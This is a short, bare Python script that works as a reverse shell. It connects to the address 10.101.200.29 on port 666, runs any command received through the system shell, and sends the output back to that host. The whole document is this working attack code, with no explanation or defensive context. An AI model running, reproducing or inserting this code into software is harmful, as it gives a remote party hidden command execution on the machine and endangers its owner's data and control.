

import socket
import subprocess
s=socket.socket()
s.connect(('10.101.200.29',666))
while True:
     proc = subprocess.Popen(s.recv(1024),  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     s.send(proc.stdout.read() + proc.stderr.read())
